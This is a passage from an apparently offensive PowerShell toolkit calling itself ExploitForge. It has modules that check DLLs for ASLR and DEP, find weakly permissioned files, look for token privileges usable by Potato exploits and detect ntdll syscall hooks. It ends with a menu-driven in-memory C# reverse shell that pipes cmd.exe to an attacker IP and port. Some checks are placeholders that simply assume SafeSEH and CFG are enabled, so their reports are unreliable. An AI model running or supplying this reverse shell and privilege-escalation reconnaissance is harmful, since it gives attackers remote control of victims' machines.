            $moduleName = $dll.ModuleName

            $nonASLR = ($filePath -match "C:\\Windows\\System32" -and $baseAddr -lt 0x70000000)

            $depDisabled = ([bool]($dll.EntryPointAddress -eq 0))

            $safeSEH = $false  # Placeholder for SafeSEH check
            if ($filePath -match "C:\\Windows\\System32") {
                $safeSEH = $true  # Assume SafeSEH is enabled for system DLLs
            }

            $cfgEnabled = $false  # Placeholder for CFG check
            if ($filePath -match "C:\\Windows\\System32") {
                $cfgEnabled = $true  # Assume CFG is enabled for system DLLs
            }

            if ($nonASLR -and $depDisabled) {
                $riskLevel = "❌ HIGH (No ASLR & No DEP)"
                $color = "Red"
                $highRisk++
            } elseif ($nonASLR -or $depDisabled) {
                $riskLevel = "⚠️ MEDIUM (One Protection Disabled)"
                $color = "Yellow"
                $mediumRisk++
            } else {
                $riskLevel = "✅ LOW (All Protections Enabled)"
                $color = "Green"
                $lowRisk++
            }

            $riskDetails = @()
            if ($nonASLR) {
                $riskDetails += "ASLR is disabled (Base Address: 0x$($baseAddr.ToString('X'))"
            }
            if ($depDisabled) {
                $riskDetails += "DEP is disabled"
            }
            if (-not $safeSEH) {
                $riskDetails += "SafeSEH is disabled"
            }
            if (-not $cfgEnabled) {
                $riskDetails += "CFG (Control Flow Guard) is disabled"
            }

            if ([string]::IsNullOrWhiteSpace($Filter) -or $riskLevel -match $Filter) {
                $results += [PSCustomObject]@{
                    "DLL Name"      = $moduleName
                    "Base Address"  = "0x$($baseAddr.ToString('X'))"
                    "ASLR"          = $nonASLR ? "❌ Disabled" : "✅ Enabled"
                    "DEP"           = $depDisabled ? "❌ Disabled" : "✅ Enabled"
                    "SafeSEH"       = $safeSEH ? "✅ Enabled" : "❌ Disabled"
                    "CFG"           = $cfgEnabled ? "✅ Enabled" : "❌ Disabled"
                    "Risk Level"    = $riskLevel
                    "Risk Details"  = $riskDetails -join ", "
                    "Location"      = $filePath
                }
            }

            $totalDLLs++
        } catch {
            Write-Host "[*] Skipped: $($dll.ModuleName) (Error: $_)" -ForegroundColor Yellow
        }
    }

    if ($results.Count -gt 0) {
        Write-Host "`n[+] Detected DLLs with security risks:" -ForegroundColor Cyan
        $results | Sort-Object "Risk Level" | Format-Table -AutoSize | Out-String | ForEach-Object {
            if ($_ -match "❌ HIGH") {
                Write-Host $_ -ForegroundColor Red
            } elseif ($_ -match "⚠️ MEDIUM") {
                Write-Host $_ -ForegroundColor Yellow
            } else {
                Write-Host $_
            }
        }
    } else {
        Write-Host "[+] No non-ASLR or non-DEP DLLs detected." -ForegroundColor Green
    }

    Write-Host "`n========== Scan Summary ==========" -ForegroundColor Cyan
    Write-Host "[✔] Total DLLs Scanned: $totalDLLs" -ForegroundColor Green
    Write-Host "[!] High-Risk DLLs: $highRisk" -ForegroundColor Red
    Write-Host "[⚠️] Medium-Risk DLLs: $mediumRisk" -ForegroundColor Yellow
    Write-Host "[✅] Low-Risk DLLs: $lowRisk" -ForegroundColor Green

    Show-Menu
}

# 13 . Enumerate-WeakFilePermissions
function Enumerate-WeakFilePermissions {
    Write-Host "[+] Scanning for files with weak permissions that may allow unauthorized modifications..." -ForegroundColor Cyan
    Write-Host "`n[+] Choose an option:" -ForegroundColor Cyan
    Write-Host "1. Scan predefined critical system paths"
    Write-Host "2. Scan a specific path of your choice"
    $choice = Read-Host "Enter your choice (1 or 2)"

    if ($choice -eq "2") {
        $customPath = Read-Host "Enter the full path to scan"
        if (-Not (Test-Path $customPath)) {
            Write-Host "[!] Error: The specified path '$customPath' does not exist." -ForegroundColor Red
            return
        }
        $pathsToCheck = @($customPath)
    }
    else {
        Write-Host "`n[+] Scanning predefined critical system paths..." -ForegroundColor Yellow
        $pathsToCheck = @(
            "C:\Windows\System32",
            "C:\Windows\SysWOW64",
            "C:\Windows\Tasks",
            "C:\Windows\Temp",
            "C:\Windows\Fonts",
            "C:\Windows\Debug",
            "C:\Windows\Installer",
            "C:\Program Files",
            "C:\Program Files (x86)",
            "C:\ProgramData",
            "C:\Users\Public",
            "C:\Users\Default",
            "C:\Users\Default\AppData",
            "C:\Users\Default\AppData\Local",
            "C:\Users\Default\AppData\Roaming",
            "C:\Users\Default\AppData\LocalLow",
            "C:\Users\Default\Desktop",
            "C:\Users\Default\Documents",
            "C:\Users\Default\Downloads",
            "C:\Users\Default\Pictures",
            "C:\Users\Default\Videos",
            "C:\Users\Default\Music"
        )
    }

    foreach ($path in $pathsToCheck) {
        Write-Host "`nScanning: $path" -ForegroundColor Yellow

        Get-ChildItem -Path $path -File -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
            $filePath = $_.FullName
            $acl = Get-Acl $filePath

            $writable = $acl.Access | Where-Object {
                ($_.FileSystemRights -match "Write|FullControl|Modify") -and
                ($_.IdentityReference -match "Everyone|Authenticated Users|BUILTIN\\Users")
            }

            if ($writable) {
                Write-Host "[!] Weak Permissions Detected: $filePath" -ForegroundColor Red
            }
        }
    }

    Show-Menu
}

# 14 . Check-PrivEsc-Vulnerability
function Check-PrivEsc-Vulnerability {
    Write-Host "[+] Scanning for privilege escalation vulnerabilities, high-risk privileges, and token manipulation risks..." -ForegroundColor Cyan
    Write-Host "`n[+] Checking for privilege escalation vulnerabilities..." -ForegroundColor Cyan

    $privs = whoami /priv | Select-String "SeImpersonatePrivilege|SeAssignPrimaryTokenPrivilege|SeTcbPrivilege"

    if ($privs) {
        Write-Host "[!] High-risk privileges detected! The system may be vulnerable." -ForegroundColor Red
        Write-Host "`n$privs`n" -ForegroundColor Yellow

        if ($privs -match "Enabled") {
            Write-Host "[+] These privileges are enabled. Exploitation may be possible!" -ForegroundColor Red
        } else {
            Write-Host "[!] Privileges exist but are not enabled. Token manipulation may still be possible." -ForegroundColor Yellow
        }
    } else {
        Write-Host "[+] No high-risk privileges found. The system is not vulnerable to token-based privilege escalation." -ForegroundColor Green
    }

    $osVer = (Get-WmiObject Win32_OperatingSystem).Version

    if ($osVer -match "^10" -or $osVer -match "^6.3" -or $osVer -match "^6.2") {
        Write-Host "[+] Windows version is compatible with Potato exploits (JuicyPotato, RoguePotato)." -ForegroundColor Green
    } else {
        Write-Host "[!] Windows version is not compatible with common Potato exploits." -ForegroundColor Yellow
    }

    Write-Host "`n[*] Checking for high-privilege processes that could be impersonated..." -ForegroundColor Cyan
    $highPrivProcesses = Get-WmiObject Win32_Process | Where-Object { $_.Name -in @(
        "services.exe", "winlogon.exe", "lsass.exe", "explorer.exe", "svchost.exe", 
        "taskmgr.exe", "wininit.exe", "smss.exe", "csrss.exe", "spoolsv.exe",
        "mmc.exe", "cmd.exe", "powershell.exe", "msiexec.exe", "dllhost.exe", 
        "werfault.exe", "wsmprovhost.exe", "conhost.exe", "rundll32.exe", 
        "wuauclt.exe", "dwm.exe", "searchindexer.exe", "winrs.exe", "System"
    ) }

    if ($highPrivProcesses) {
        Write-Host "[!] Found processes running with high privileges that may be vulnerable to token theft:" -ForegroundColor Yellow
        
        foreach ($proc in $highPrivProcesses) {
            # Fix: Retrieve process owner safely
            $ownerInfo = Get-CimInstance Win32_Process -Filter "ProcessId=$($proc.ProcessId)" | Invoke-CimMethod -MethodName GetOwner
            $user = if ($ownerInfo) { "$($ownerInfo.Domain)\$($ownerInfo.User)" } else { "Unknown" }

            # Check if process runs as SYSTEM
            if ($user -match "NT AUTHORITY\\SYSTEM") {
                $systemStatus = "SYSTEM - HIGH RISK"
                $color = "Red"
            } else {
                $systemStatus = "Not SYSTEM"
                $color = "Green"
            }

            Write-Host "    - $($proc.Name) (PID: $($proc.ProcessId)) - User: $user - Status: $systemStatus" -ForegroundColor $color
        }
    } else {
        Write-Host "[+] No high-privilege processes detected for token theft attacks." -ForegroundColor Green
    }

    Write-Host "`n[*] Confirming token theft possibility..." -ForegroundColor Cyan
    $tokenPrivs = whoami /priv | Select-String "SeImpersonatePrivilege|SeAssignPrimaryTokenPrivilege"

    if ($tokenPrivs -match "Enabled") {
        Write-Host "[!] Token manipulation privileges (SeImpersonate/SeAssignPrimaryToken) are ENABLED!" -ForegroundColor Red
        Write-Host "[!] This system is vulnerable to token theft and privilege escalation." -ForegroundColor Red
    } else {
        Write-Host "[+] Token manipulation privileges are NOT enabled. No immediate token theft risk." -ForegroundColor Green
    }

    Write-Host "`n[*] Checking for writable MSI installer files (MSI Hijacking)..." -ForegroundColor Cyan
    $msiFiles = Get-ChildItem -Path "C:\Windows\Installer\" -File -Filter "*.msi" -ErrorAction SilentlyContinue | Where-Object {
        (Get-Acl $_.FullName).Access | Where-Object { $_.FileSystemRights -match "Write|Modify|FullControl" -and $_.IdentityReference -match "Everyone|BUILTIN\\Users" }
    }
    if ($msiFiles) {
        Write-Host "[!] Writable MSI files found (Potential MSI hijacking vulnerability):" -ForegroundColor Red
        $msiFiles | ForEach-Object { Write-Host "    - $($_.FullName)" -ForegroundColor Yellow }
    } else {
        Write-Host "[+] No writable MSI files detected." -ForegroundColor Green
    }

    Write-Host "[+] Privilege Escalation Vulnerability Check Completed." -ForegroundColor Green
    Show-Menu
}




# 15 . Detect-SyscallHooks
function Detect-SyscallHooks {
    # If SyscallDetector exists but ReadProcessMemory is missing, restart the script
    if ("SyscallDetector" -as [type]) {
        $methods = [SyscallDetector].GetMethods() | Where-Object { $_.Name -eq "ReadProcessMemory" }
        if (-not $methods) {
            
            Write-Host "[-] ReadProcessMemory is missing! Restarting PowerShell session..." -ForegroundColor Red
            Start-Process -FilePath "powershell.exe" -ArgumentList "-NoExit -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -WindowStyle Normal
            exit
        }
    }

    if (-not ("SyscallDetector" -as [type])) {
        Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class SyscallDetector {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool ReadProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        [Out] byte[] lpBuffer,
        int dwSize,
        out int lpNumberOfBytesRead
    );
}
"@ -Language CSharp
    }
    Write-Host "[+] Scanning ntdll.dll for hooked syscalls that may indicate security monitoring or tampering..." -ForegroundColor Cyan
    Write-Host "Scanning for hooked syscalls in ntdll.dll..." -ForegroundColor Cyan

    $ntdllHandle = [SyscallDetector]::GetModuleHandle("ntdll.dll")

    if ($ntdllHandle -eq [IntPtr]::Zero) {
        Write-Host "[-] Failed to get handle for ntdll.dll" -ForegroundColor Red
        Show-Menu
        return
    }

    $syscalls = @("NtOpenProcess", "NtCreateFile", "NtReadVirtualMemory", "NtWriteVirtualMemory", "NtQuerySystemInformation", "NtAllocateVirtualMemory", "NtProtectVirtualMemory")

    # Log file
    $logFile = "$env:TEMP\SyscallHookReport.txt"
    "`n--- Syscall Hook Detection Report ---`n" | Out-File -Append -Encoding utf8 $logFile

    foreach ($syscall in $syscalls) {
        $syscallAddress = [SyscallDetector]::GetProcAddress($ntdllHandle, $syscall)

        if ($syscallAddress -eq [IntPtr]::Zero) {
            Write-Host "[-] Failed to get address of $syscall" -ForegroundColor Red
            continue
        }

        # Read first 6 bytes to check for hooks
        $buffer = New-Object byte[] 6
        $bytesRead = 0
        $processHandle = (Get-Process -Id $PID).Handle

        try {
            $result = [SyscallDetector]::ReadProcessMemory($processHandle, $syscallAddress, $buffer, $buffer.Length, [ref]$bytesRead)
        } catch {
            $errorMessage = $Error[0].Exception.Message
            Write-Host "[-] Error calling ReadProcessMemory for " -NoNewline
            Write-Host "$syscall - " -NoNewline
            Write-Host "$errorMessage" -ForegroundColor Red
            continue
        }

        if ($result -eq $false -or $bytesRead -lt 6) {
            Write-Host "[-] Failed to read memory for $syscall" -ForegroundColor Yellow
            continue
        }

        # Check for common hook patterns (JMP, INT3, MOV ABS)
        $hookDetected = $false
        if ($buffer[0] -eq 0xE9) { 
            Write-Host "[!] Hook Detected: $syscall (JMP Instruction)" -ForegroundColor Red
            $hookDetected = $true
        } elseif ($buffer[0] -eq 0xCC) { 
            Write-Host "[!] Hook Detected: $syscall (INT3 Breakpoint)" -ForegroundColor Red
            $hookDetected = $true
        } elseif (($buffer[0] -eq 0x48 -and $buffer[1] -eq 0xB8) -or ($buffer[0] -eq 0xFF -and $buffer[1] -eq 0x25)) { 
            Write-Host "[!] Hook Detected: $syscall (MOV ABS / JMP ABS)" -ForegroundColor Red
            $hookDetected = $true
        } else {
            Write-Host "[*] $syscall is clean" -ForegroundColor Green
        }

        if ($hookDetected) {
            "[!] $syscall is hooked in memory at 0x$("{0:X}" -f $syscallAddress)" | Out-File -Append -Encoding utf8 $logFile
        } else {
            "[*] $syscall is clean" | Out-File -Append -Encoding utf8 $logFile
        }
    }

    Write-Host "`n[*] Syscall Hook Detection Completed. Report saved at: $logFile" -ForegroundColor Green
    Write-Host "`nReturning to menu..." -ForegroundColor Cyan
    Show-Menu
}

# 16 . Generate-ReverseShell
function Generate-ReverseShell {
    Write-Host "[+] Compiling and executing an in-memory C# reverse shell for remote command execution..." -ForegroundColor Cyan
    $AttackerIP = Read-Host "Enter attacker IP"
    $AttackerPort = Read-Host "Enter attacker port"

    if (-not ($AttackerIP -match "^\d{1,3}(\.\d{1,3}){3}$")) {
        Write-Host "[!] Invalid IP address. Please provide a valid IPv4 address." -ForegroundColor Red
        return
    }
    if ($AttackerPort -lt 1 -or $AttackerPort -gt 65535) {
        Write-Host "[!] Invalid port number. Please provide a port between 1 and 65535." -ForegroundColor Red
        return
    }

    $csharpCode = @"
using System;
using System.Net.Sockets;
using System.Text;
using System.Diagnostics;
using System.Threading;

public class ReverseShell
{
    public static void Main(string[] args)
    {
        // Start the reverse shell in a background thread
        Thread reverseShellThread = new Thread(RunReverseShell);
        reverseShellThread.IsBackground = true;
        reverseShellThread.Start();
    }

    private static void RunReverseShell()
    {
        string ip = "$AttackerIP";
        int port = $AttackerPort;

        int retryCount = 3;
        bool connected = false;
        while (retryCount > 0 && !connected)
        {
            try
            {
                using (TcpClient client = new TcpClient())
                {
                    // Set connection timeout (5 seconds)
                    var result = client.BeginConnect(ip, port, null, null);
                    bool success = result.AsyncWaitHandle.WaitOne(TimeSpan.FromSeconds(5));
                    if (!success)
                    {
                        throw new Exception("Connection timed out.");
                    }
                    client.EndConnect(result);
                    connected = true;

                    using (NetworkStream stream = client.GetStream())
                    {
                        using (Process proc = new Process())
                        {
                            proc.StartInfo.FileName = "cmd.exe";
                            proc.StartInfo.CreateNoWindow = true;
                            proc.StartInfo.UseShellExecute = false;
                            proc.StartInfo.RedirectStandardOutput = true;
                            proc.StartInfo.RedirectStandardInput = true;
                            proc.StartInfo.RedirectStandardError = true;
                            proc.OutputDataReceived += (sender, e) =>
                            {
                                if (!string.IsNullOrEmpty(e.Data))
                                {
                                    byte[] data = Encoding.ASCII.GetBytes(e.Data + "\n");
                                    stream.Write(data, 0, data.Length);
                                }
                            };
                            proc.ErrorDataReceived += (sender, e) =>
                            {
                                if (!string.IsNullOrEmpty(e.Data))
                                {
                                    byte[] data = Encoding.ASCII.GetBytes(e.Data + "\n");
                                    stream.Write(data, 0, data.Length);
                                }
                            };
                            proc.Start();
                            proc.BeginOutputReadLine();
                            proc.BeginErrorReadLine();

                            byte[] buffer = new byte[1024];
                            int bytesRead;
                            while (true)
                            {
                                if (stream.DataAvailable)
                                {
                                    bytesRead = stream.Read(buffer, 0, buffer.Length);
                                    string command = Encoding.ASCII.GetString(buffer, 0, bytesRead);
                                    proc.StandardInput.WriteLine(command);
                                }
                                else
                                {
                                    Thread.Sleep(100); // Avoid high CPU usage
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                retryCount--;
                if (retryCount == 0)
                {
                    Console.WriteLine("Failed to connect: " + ex.Message);
                }
                else
                {
                    Console.WriteLine("Retrying... Attempts left: " + retryCount);
                    Thread.Sleep(2000);
                }
            }
        }
    }
}
"@

    if (-not ([System.Management.Automation.PSTypeName]'ReverseShell').Type)
    {
        Write-Host "[+] Compiling and executing C# reverse shell in memory..." -ForegroundColor Cyan
        try {
            Add-Type -TypeDefinition $csharpCode -Language CSharp
        }
        catch {
            Write-Host "[!] Failed to compile C# code. Error: $_" -ForegroundColor Red
            Write-Host "[+] Returning to the main menu..." -ForegroundColor Green
            return
        }
    }
    else
    {
        Write-Host "[!] ReverseShell type already exists. Skipping compilation." -ForegroundColor Yellow
    }

    [ReverseShell]::Main(@())

    Write-Host "[+] Reverse shell is running in the background. Returning to main menu..." -ForegroundColor Green
    Show-Menu
}

# =======================
# Main Menu
# =======================

function Show-Menu {
    Write-Host "`nSelect an enumeration module to run:" -ForegroundColor Yellow
    Write-Host "[1]  Kernel Exploit Detection & CVE Mapping"
    Write-Host "[2]  ROP & JOP Gadget Finder"
    Write-Host "[3]  Syscall Index Extractor "
    Write-Host "[4]  Heap Spray Analysis"
    Write-Host "[5]  DLL Hijacking Scanner"
    Write-Host "[6]  Enumerate NamedPipes"
    Write-Host "[7]  Direct Syscall Execution for Exploits"
    Write-Host "[8]  Detect Privilege Escalation Paths (Token Analysis)"
    Write-Host "[9]  Memory Analysis for Suspicious Regions"
    Write-Host "[10] Detect Suspicious COM-Hijacking"
    Write-Host "[11] Enumerate KernelMemory"
    Write-Host "[12] Enumerate NonASLR-DLLs"
    Write-Host "[13] Enumerate WeakFilePermissions"
    Write-Host "[14] Check-PrivEsc-Vulnerability"
    Write-Host "[15] Detect-SyscallHooks"
    Write-Host "[16] Generate-ReverseShell"
    Write-Host "[17] Exit`n"

    $choice = Read-Host "Enter your choice"
    switch ($choice) {
        1  { Detect-KernelExploits }
        2  { Find-ROP-JOP-Gadgets }
        3  { Extract-SyscallIndexes }
        4  { Analyze-HeapSpray }
        5  { Find-DLLHijacking }
        6  { Enumerate-NamedPipes }
        7  { Execute-Syscall }
        8  { Analyze-Privileges }
        9  { Analyze-MemoryRegions }
        10 { Detect-COM-Hijacking }
        11 { Enumerate-KernelMemory }
        12 { Enumerate-NonASLR-DLLs }
        13 { Enumerate-WeakFilePermissions }
        14 { Check-PrivEsc-Vulnerability }
        15 { Detect-SyscallHooks }
        16 { Generate-ReverseShell }
        17  { Write-Host "Exiting ExploitForge." -ForegroundColor Green; exit }
        default { Write-Host "Invalid option, try again." -ForegroundColor Red; Show-Menu }
    }
}

Show-Logo
Show-Menu



